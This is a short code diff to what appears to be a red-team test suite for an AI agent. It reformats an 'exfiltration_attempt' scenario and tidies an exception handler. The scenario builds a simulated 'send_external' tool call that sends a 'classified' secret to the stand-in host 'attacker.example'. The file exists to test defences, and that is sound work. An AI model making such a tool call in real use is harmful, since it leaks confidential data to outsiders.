@@ -403,7 +403,10 @@ async def exfiltration_attempt() -> AttackResult:
                 ToolCall(
                     id="exfil-1",
                     name="send_external",
-                    arguments={"secret": "classified", "target": "attacker.example"},  # pragma: allowlist secret
+                    arguments={
+                        "secret": "classified",
+                        "target": "attacker.example",
+                    },  # pragma: allowlist secret
                 )
             )
         ]
@@ -501,7 +504,7 @@ async def run_attacks() -> list[AttackResult]:
         try:
             results.append(await attack())
         # Unexpected runtime failures must be reported as failed security scenarios.
-        except Exception as exc:  # noqa: BLE001
+        except Exception as exc:
             results.append(
                 AttackResult(
                     id=f"ERROR-{attack.__name__}",
